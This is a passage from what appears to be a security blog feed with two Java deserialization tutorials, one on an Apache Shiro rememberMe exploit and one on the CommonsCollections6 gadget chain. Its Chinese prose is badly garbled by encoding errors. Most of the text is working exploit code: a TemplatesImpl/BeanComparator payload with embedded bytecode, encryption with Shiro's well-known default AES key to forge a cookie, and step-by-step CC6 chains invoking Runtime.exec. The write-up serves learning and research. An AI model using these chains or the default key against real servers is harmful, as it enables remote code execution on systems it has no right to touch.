clazzBytes) throws Exception &#123;  </span><br><span class="line">            TemplatesImpl templates = new TemplatesImpl();  </span><br><span class="line">            setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]&#123;clazzBytes&#125;);  </span><br><span class="line">            setFieldValue(templates,&quot;_name&quot;,&quot;ku1s&quot;);  </span><br><span class="line">            setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());  </span><br><span class="line">  </span><br><span class="line">            BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);//ä½¿ property =null é¿å…å‡ºé”™  </span><br><span class="line">  </span><br><span class="line">            final PriorityQueue&lt;Object&gt; priorityQueue = new PriorityQueue&lt;Object&gt;(2, comparator);  </span><br><span class="line">  </span><br><span class="line">            priorityQueue.add(&quot;1&quot;);  </span><br><span class="line">            priorityQueue.add(&quot;1&quot;);  </span><br><span class="line">            //å°†æ²¡æ”¹çš„å€¼ æ”¹æˆæ¶æ„å€¼  </span><br><span class="line">            setFieldValue(comparator,&quot;property&quot;,&quot;outputProperties&quot;); //æ”¹æˆoutputProperties,ä½¿è‡ªåŠ¨è°ƒç”¨getOutputProperties  </span><br><span class="line">            setFieldValue(priorityQueue,&quot;queue&quot;,new Object[]&#123;templates, templates&#125;); //è®©å…¶å»å¯¹æ¯”ï¼Œä¸”æ»¡è¶³ queue[right]) &gt; 0  </span><br><span class="line">  </span><br><span class="line">            // ==================            // ç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸²  </span><br><span class="line">            ByteArrayOutputStream barr = new ByteArrayOutputStream();  </span><br><span class="line">            ObjectOutputStream oos = new ObjectOutputStream(barr);  </span><br><span class="line">            oos.writeObject(priorityQueue);  </span><br><span class="line">            oos.close();  </span><br><span class="line">  </span><br><span class="line">            return barr.toByteArray();  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;  </span><br><span class="line">            Field field = obj.getClass().getDeclaredField(fieldName);  </span><br><span class="line">            field.setAccessible(true);  </span><br><span class="line">            field.set(obj, value);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>Client.class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public class Client &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">        byte[] payloads = new CommonsCollectionsShiro().getPayload(&quot;yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBAA1FdmlsVGVzdC5qYXZhDAAOAA8HABwMAB0AHgEABGNhbGMMAB8AIAEACEV2aWxUZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAMAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAAEQALAAAABAABAAwAAQAOAA8AAgAJAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAoAAAAOAAMAAAASAAQAEwANABQACwAAAAQAAQAQAAEAEQAAAAIAEg&quot;.getBytes());  </span><br><span class="line">        AesCipherService aes = new AesCipherService();  </span><br><span class="line">  </span><br><span class="line">        byte[] key = Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;);  </span><br><span class="line">        ByteSource ciphertext = aes.encrypt(payloads, key);  </span><br><span class="line">        System.out.printf(ciphertext.toString());  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆçš„POCä¼ å…¥cookieï¼Œå¼¹å‡ºè®¡ç®—å™¨</p><p><img src="/2023/05/19/JAVA-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3/gg.png"></p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>JAVAå®‰å…¨ä»»é‡é“è¿œï¼Œå¸Œæœ›å¯¹ä½ æœ‰æ‰€å¸®åŠ©ï¼</p>]]></content>
      
      
      <categories>
          
          <category> JAVAå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA-CommonsCollections6</title>
      <link href="/2023/05/17/JAVA-CommonsCollections6/"/>
      <url>/2023/05/17/JAVA-CommonsCollections6/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸ºä»€ä¹ˆéœ€è¦CC6"><a href="#ä¸ºä»€ä¹ˆéœ€è¦CC6" class="headerlink" title="ä¸ºä»€ä¹ˆéœ€è¦CC6"></a>ä¸ºä»€ä¹ˆéœ€è¦CC6</h1><p>å› ä¸ºè¿™æ˜¯ Shiro ä¼šåˆ©ç”¨åˆ°çš„ä¸€æ¡é“¾å­ å¯ä»¥è¯´æ˜¯ CC1 + lazymap çš„ä¸€ç§é‡åˆï¼Œä½†æ˜¯åœ¨ 8U71ä¹‹åï¼ŒCC1ä¸èƒ½ç”¨äº†ï¼Œä¸»è¦æ˜¯sun.reflect.annotation.AnnotationInvocationHandler#readObject çš„é€»è¾‘å˜åŒ–äº†ã€‚</p><p>CC6 å¯ä»¥è¯´æ˜¯åœ¨CCåº“ä¸­ ç›¸å¯¹æ¯”è¾ƒé€šç”¨çš„åˆ©ç”¨é“¾ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆ æˆ‘CSDN ä¸­ä¹Ÿå†™äº†ï¼Œå¹¶å†³å®šå‘åœ¨è¿™çš„åŸå› ï¼Œåœ¨åç»­çš„Shiro ä¸­ ä½¿ç”¨é¢‘ç‡è¿˜æ˜¯å¾ˆé«˜çš„ï¼Œæ‰€ä»¥æˆ‘å†³å®šå†æ¬¡æ·±å…¥äº†è§£å…¶åŸç†ã€‚ä¸ºäº†è§£å†³é«˜ç‰ˆæœ¬ä¸­ JAVAçš„åˆ©ç”¨é—®é¢˜ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹çœ‹æ­¤é“¾ï¼Œç»§ç»­è´´ä¸Šæˆ‘çš„çè—å›¾ï¼š</p><p><img src="/2023/05/17/JAVA-CommonsCollections6/cc%E9%93%BE.jpg"></p><p>å¯ä»¥çœ‹åˆ° CC6 æ˜¯åˆ©ç”¨çš„ HashMapçš„é“¾å­ï¼Œè¿™é‡Œè´´ä¸€ä¸‹Pç¥ ç®€åŒ–çš„åˆ©ç”¨é“¾ä»£ç ;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">/* Gadget chain: </span><br><span class="line">java.io.ObjectInputStream.readObject() </span><br><span class="line">java.util.HashMap.readObject() </span><br><span class="line">java.util.HashMap.hash() </span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode() org.apache.commons.collections.keyvalue.TiedMapEntry.getValue() </span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.map.LazyMap.get() </span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.functors.ChainedTransformer.transform() </span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.functors.InvokerTransformer.transform() java.lang.reflect.Method.invoke() java.lang.Runtime.exec() */</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªé“¾ ä¸»è¦æ˜¯è¦çœ‹ä»æœ€å¼€å§‹åˆ° org.apache.commons.collections.map.LazyMap.get() çš„é‚£â¼€éƒ¨ åˆ†<br>ç®€å•æ¥è¯´ï¼Œè§£å†³Javaâ¾¼ç‰ˆæœ¬åˆ©â½¤é—® é¢˜ï¼Œå®é™…ä¸Šå°±æ˜¯åœ¨æ‰¾ä¸Šä¸‹â½‚ä¸­æ˜¯å¦è¿˜æœ‰å…¶ä»–è°ƒâ½¤ LazyMap#get() çš„åœ°â½…ã€‚</p><p>æ‰¾åˆ°çš„ç±»æ˜¯ æ˜¯ org.apache.commons.collections.keyvalue.TiedMapEntry ï¼Œåœ¨å…¶getValueâ½…æ³• ä¸­è°ƒâ½¤äº† this.map.get ï¼Œâ½½å…¶hashCodeâ½…æ³•è°ƒâ½¤äº†getValueâ½…æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">public class TiedMapEntry implements Map.Entry, KeyValue, Serializable &#123;  </span><br><span class="line">  </span><br><span class="line">private static final long serialVersionUID = -8453869361373831205L;  </span><br><span class="line"></span><br><span class="line">    public TiedMapEntry(Map map, Object key) &#123;  </span><br><span class="line">        super();  </span><br><span class="line">        this.map = map;  </span><br><span class="line">        this.key = key;  </span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">   public Object getKey() &#123;  </span><br><span class="line">        return key;  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public Object getValue() &#123;  </span><br><span class="line">        return map.get(key);  </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">// ....</span><br><span class="line"></span><br><span class="line">public int hashCode() &#123; </span><br><span class="line">Object value = this.getValue(); </span><br><span class="line">return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode()); &#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœè¿™é‡Œçš„ map &#x3D; LazyMap å°±ä¼šè°ƒç”¨LazyMap#get è§¦å‘CC1åˆ©ç”¨é“¾ï¼Œæ¬²è§¦å‘LazyMapåˆ©â½¤é“¾ï¼Œè¦æ‰¾åˆ°å°±æ˜¯å“ªâ¾¥è°ƒâ½¤äº† TiedMapEntry#hashCode ã€‚</p><p>ï¼Œåœ¨ java.util.HashMap#readObject ä¸­å°±å¯ä»¥æ‰¾åˆ° HashMap#hash() çš„è°ƒâ½¤ï¼Œå»æ‰äº† æœ€å‰â¾¯çš„ä¸¤æ¬¡è°ƒâ½¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public class HashMap extends AbstractMap implements Map, Cloneable, Serializable &#123;</span><br><span class="line">static final int hash(Object key) &#123; </span><br><span class="line">int h;</span><br><span class="line">return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16); &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">private void readObject(java.io.ObjectInputStream s) throws IOException,ClassNotFoundException &#123;</span><br><span class="line"> s.defaultReadObject(); // ... p for (int i = 0; i &lt; mappings; i++) &#123; </span><br><span class="line"> @SuppressWarnings(&quot;unchecked&quot;) K key = (K) s.readObject(); </span><br><span class="line"> @SuppressWarnings(&quot;unchecked&quot;) V value = (V) s.readObject(); putVal(hash(key), </span><br><span class="line"> key, value, false, false); &#125; &#125; &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åœ¨HashMapçš„readObjectâ½…æ³•ä¸­ï¼Œè°ƒâ½¤åˆ°äº† hash(key) ï¼Œâ½½hashâ½…æ³•ä¸­ï¼Œè°ƒâ½¤åˆ°äº† key.hashCode() ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬åªéœ€è¦è®©è¿™ä¸ªkeyç­‰äºTiedMapEntryå¯¹è±¡ï¼Œå³å¯è¿æ¥ä¸Šå‰â¾¯çš„åˆ†æè¿‡ ç¨‹ï¼Œæ„æˆâ¼€ä¸ªå®Œæ•´çš„Gadgetã€‚</p><h1 id="é€æ­¥æ„é€ POC"><a href="#é€æ­¥æ„é€ POC" class="headerlink" title="é€æ­¥æ„é€ POC"></a>é€æ­¥æ„é€ POC</h1><p>ç„¶åå°è¯• è‡ªå·±æ„é€ ä¸€æ³¢è¿™ä¸ª POCï¼Œå†è¯´è¯´è‡ªå·±çš„è¸©å‘è¿‡ç¨‹ï¼Œå»ºè®®éƒ½è‡ªå·±æ„é€ ä¸€æ¬¡ï¼Œå†æ¥æ‰¾é—®é¢˜ï¼Œè™½ç„¶ ä¼šæœ‰ç‚¹é•¿ï¼Œä½†æ˜¯ä½ ä¸€æ­¥æ­¥è‡ªå·±æ„é€ ä¸€å®šä¼šæ”¶è·é¢‡ä¸°ï¼ ä»¥ä¸‹æ˜¯æˆ‘ä¸ªäººçš„POC  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">public class CC66 &#123;  </span><br><span class="line">  </span><br><span class="line">    public static void main(String[] args) throws  Exception&#123;  </span><br><span class="line">  </span><br><span class="line">        //Runtimeæ„é€ éƒ¨åˆ†  </span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;  </span><br><span class="line">            new ConstantTransformer(Class.forName(&quot;java.lang.Runtime&quot;)),  </span><br><span class="line">            new InvokerTransformer(  </span><br><span class="line">                &quot;getMethod&quot;,  </span><br><span class="line">                new Class[]&#123;String.class,Class[].class&#125;,  </span><br><span class="line">                new Object[]&#123;&quot;getRuntime&quot;,new Class[0]&#125;  </span><br><span class="line">            ),  </span><br><span class="line">            new InvokerTransformer(  </span><br><span class="line">                &quot;invoke&quot;,  </span><br><span class="line">                new Class[]&#123;Object.class,Object[].class&#125;,  </span><br><span class="line">                new Object[]&#123;null,new Object[0]&#125;  </span><br><span class="line">            ),  </span><br><span class="line">            new InvokerTransformer(  </span><br><span class="line">                &quot;exec&quot;,  </span><br><span class="line">                new Class[]&#123;String.class&#125;,  </span><br><span class="line">                new Object[]&#123;&quot;calc&quot;&#125;  </span><br><span class="line">            )  </span><br><span class="line">        &#125;;  </span><br><span class="line">        //ChainedTransformeræ„é€ éƒ¨åˆ†  </span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  </span><br><span class="line">  </span><br><span class="line">        //LazyMapæ„é€ éƒ¨åˆ†  </span><br><span class="line">        HashMap innerMap = new HashMap();  </span><br><span class="line">        Map outMap = LazyMap.decorate(innerMap, chainedTransformer); //outMap = LazyMapç±»  </span><br><span class="line">  </span><br><span class="line">        //TiedMapEntryæ„é€ éƒ¨åˆ†  </span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(outMap, &quot;Ku1s-1&quot;);  </span><br><span class="line">  </span><br><span class="line">        //HashMapæ„é€ éƒ¨åˆ†  </span><br><span class="line">        HashMap hashMap = new HashMap();  </span><br><span class="line">        hashMap.put(tiedMapEntry,&quot;Ku1s-2&quot;);  </span><br><span class="line">  </span><br><span class="line">        byte[] serialize = serialize(hashMap);  </span><br><span class="line">        unserialize(serialize);  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static void unserialize(byte[] bytes) throws Exception&#123;  </span><br><span class="line">        try(ByteArrayInputStream bain = new ByteArrayInputStream(bytes);  </span><br><span class="line">            ObjectInputStream oin = new ObjectInputStream(bain))&#123;  </span><br><span class="line">            oin.readObject();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static byte[] serialize(Object o) throws Exception &#123;  </span><br><span class="line">        try (ByteArrayOutputStream baout = new ByteArrayOutputStream();  </span><br><span class="line">             ObjectOutputStream oout = new ObjectOutputStream(baout)) &#123;  </span><br><span class="line">            oout.writeObject(o);  </span><br><span class="line">            return baout.toByteArray();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨~</p><p><img src="/2023/05/17/JAVA-CommonsCollections6/exec1.PNG"></p><p>ä½†å®é™…ä¸Š æˆ‘ä»¬è¿™ä¸ªè®¡ç®—å™¨å¼¹çš„æ˜¯ä¸æ­£ç¡®çš„ï¼Œä¸ºäº†é¿å…æœ¬åœ°è°ƒè¯•æ—¶è§¦å‘å‘½ä»¤æ‰§ â¾æˆ‘ä»¬å¯ä»¥åŠ å…¥ å‡ çš„Transformeræ•°ç»„è¿›å»ï¼Œç­‰æœ€åè¦â½£æˆPayloadçš„ æ—¶å€™ï¼Œå†ç”Ÿæˆä¸€ä¸ª ChainedTransformerï¼Œè°ƒç”¨å…¶æ–¹æ³•ï¼Œå†æŠŠçœŸæ­£çš„ transformers æ›¿æ¢è¿›å»ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] fakeTransformers = new Transformer[] &#123;new ConstantTransformer(1)&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">public class CC66 &#123;  </span><br><span class="line">  </span><br><span class="line">    public static void main(String[] args) throws  Exception&#123;  </span><br><span class="line">  </span><br><span class="line">        //Runtimeæ„é€ éƒ¨åˆ†  </span><br><span class="line">        Transformer[] fakeTransformers = new Transformer[] &#123;new ConstantTransformer(1)&#125;;  </span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;  </span><br><span class="line">            new ConstantTransformer(Class.forName(&quot;java.lang.Runtime&quot;)),  </span><br><span class="line">            new InvokerTransformer(  </span><br><span class="line">                &quot;getMethod&quot;,  </span><br><span class="line">                new Class[]&#123;String.class,Class[].class&#125;,  </span><br><span class="line">                new Object[]&#123;&quot;getRuntime&quot;,new Class[0]&#125;  </span><br><span class="line">            ),  </span><br><span class="line">            new InvokerTransformer(  </span><br><span class="line">                &quot;invoke&quot;,  </span><br><span class="line">                new Class[]&#123;Object.class,Object[].class&#125;,  </span><br><span class="line">                new Object[]&#123;null,new Object[0]&#125;  </span><br><span class="line">            ),  </span><br><span class="line">            new InvokerTransformer(  </span><br><span class="line">                &quot;exec&quot;,  </span><br><span class="line">                new Class[]&#123;String.class&#125;,  </span><br><span class="line">                new Object[]&#123;&quot;calc&quot;&#125;  </span><br><span class="line">            )  </span><br><span class="line">        &#125;;  </span><br><span class="line">        //ChainedTransformeræ„é€ éƒ¨åˆ†  </span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers);  </span><br><span class="line">  </span><br><span class="line">        //LazyMapæ„é€ éƒ¨åˆ†  </span><br><span class="line">        HashMap innerMap = new HashMap();  </span><br><span class="line">        Map outMap = LazyMap.decorate(innerMap, chainedTransformer); //outMap = LazyMapç±»  </span><br><span class="line">  </span><br><span class="line">        //TiedMapEntryæ„é€ éƒ¨åˆ†  </span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(outMap, &quot;Ku1s-1&quot;);  </span><br><span class="line">  </span><br><span class="line">        //HashMapæ„é€ éƒ¨åˆ†  </span><br><span class="line">        HashMap hashMap = new HashMap();  </span><br><span class="line">        hashMap.put(tiedMapEntry,&quot;Ku1s-2&quot;);  </span><br><span class="line">  </span><br><span class="line">        Class clazz = Class.forName(&quot;org.apache.commons.collections.functors.ChainedTransformer&quot;);  </span><br><span class="line">        Field field = clazz.getDeclaredField(&quot;iTransformers&quot;);  </span><br><span class="line">        field.setAccessible(true);  </span><br><span class="line">        field.set(chainedTransformer,transformers);  </span><br><span class="line">  </span><br><span class="line">        byte[] serialize = serialize(hashMap);  </span><br><span class="line">        unserialize(serialize);  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static void unserialize(byte[] bytes) throws Exception&#123;  </span><br><span class="line">        try(ByteArrayInputStream bain = new ByteArrayInputStream(bytes);  </span><br><span class="line">            ObjectInputStream oin = new ObjectInputStream(bain))&#123;  </span><br><span class="line">            oin.readObject();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    public static byte[] serialize(Object o) throws Exception &#123;  </span><br><span class="line">        try (ByteArrayOutputStream baout = new ByteArrayOutputStream();  </span><br><span class="line">             ObjectOutputStream oout = new ObjectOutputStream(baout)) &#123;  </span><br><span class="line">            oout.writeObject(o);  </span><br><span class="line">            return baout.toByteArray();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œï¼Œè¿™ä¸‹Gäº†  è¿è®¡ç®—å™¨éƒ½ä¸å¼¹äº†â€¦â€¦..</p><h1 id="ä¸ºä»€ä¹ˆæ²¡æœ‰å¼¹å‡ºè®¡ç®—å™¨ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆæ²¡æœ‰å¼¹å‡ºè®¡ç®—å™¨ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆæ²¡æœ‰å¼¹å‡ºè®¡ç®—å™¨ï¼Ÿ"></a>ä¸ºä»€ä¹ˆæ²¡æœ‰å¼¹å‡ºè®¡ç®—å™¨ï¼Ÿ</h1><p>å•æ­¥è°ƒè¯•â¼€ä¸‹ ï¼Œä¼šå‘ç°å…³é”®ç‚¹åœ¨LazyMapçš„getâ½…æ³• ï¼Œä»–æ²¡æœ‰è¿›å…¥è¿™ä¸ªifè¯­å¥ï¼Œå¾—åˆ°çš„ç»“æœå°±æ˜¯æ²¡æœ‰è§¦å‘æˆ‘ä»¬çš„å‘½ä»¤ </p><p><img src="/2023/05/17/JAVA-CommonsCollections6/ec.jpG"></p><p>è¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢?<br><code>_containsKey_æ–¹æ³•â€”â€”åˆ¤æ–­æ˜¯å¦åŒ…å«æŒ‡å®šçš„é”®å</code>  </p><p>å”¯ä¸€å‡ºç° Ku1s - 1 çš„åœ°æ–¹ å°±æ˜¯åœ¨æˆ‘ä»¬ new TiedMapEntry çš„æ—¶å€™<br>ä½† TiedMapEntry çš„æ„é€ å‡½æ•°å¹¶æ²¡æœ‰ä¿®æ”¹outerMap</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//LazyMapæ„é€ éƒ¨åˆ†  </span><br><span class="line">HashMap innerMap = new HashMap();  </span><br><span class="line">Map outMap = LazyMap.decorate(innerMap, chainedTransformer); //outMap = LazyMapç±»  </span><br><span class="line">  </span><br><span class="line">//TiedMapEntryæ„é€ éƒ¨åˆ†  </span><br><span class="line">TiedMapEntry tiedMapEntry = new TiedMapEntry(outMap, &quot;Ku1s-1&quot;);</span><br><span class="line"></span><br><span class="line">HashMap hashMap = new HashMap();  </span><br><span class="line">hashMap.put(tiedMapEntry,&quot;Ku1s-2&quot;);</span><br></pre></td></tr></table></figure><p>å…¶å®å…³é”®ç‚¹å°±åœ¨äº hashMap.put(tiedMapEntry,â€Ku1s-2â€); è¯­å¥</p><p>HashMapçš„putâ½…æ³•ä¸­ï¼Œä¹Ÿæœ‰è°ƒâ½¤åˆ° hash(key) ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public V put(K key, V value) &#123; </span><br><span class="line">return putVal(hash(key), key, value, false, true); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å“ˆå“ˆå“ˆ  è¿™å°±ç›¸å½“äºæ’äº†ä¸ªä¹Œé¾™ï¼~ æœ¬æ¥æ˜¯æƒ³åˆ©ç”¨ readObject ä¸­çš„ hash()å»è°ƒç”¨çš„ï¼Œæ²¡æ›¾æƒ³putæ–¹æ³•ä¹Ÿèƒ½å¤Ÿè§¦å‘è¿™ä¸ª hash ï¼Œä¹Ÿå°±æ˜¯è¯´æå‰æŠŠæˆ‘ä»¬çš„ä»£ç æ‰§è¡Œäº†ä¸€éï¼Œå› ä¸ºæˆ‘å‰â¾¯â½¤äº† fakeTransformers ï¼Œæ‰€ä»¥æ­¤ æ—¶å¹¶æ²¡æœ‰è§¦å‘å‘½ä»¤æ‰§â¾ï¼Œä½†å®é™…ä¸Šä¹Ÿå¯¹æˆ‘ä»¬æ„é€ Payloadäº§â½£äº†å½±å“ã€‚</p><p>æˆ‘ä»¬çš„è§£å†³â½…æ³•ä¹Ÿå¾ˆç®€å•ï¼Œåªéœ€è¦å°†Ku1s-1è¿™ä¸ªKeyï¼Œå†ä»outerMapä¸­ç§»é™¤å³ å¯ï¼š outerMap.remove(â€œKu1s-1â€) ã€‚</p><p>å®Œæ•´POCï¼š</p><figure 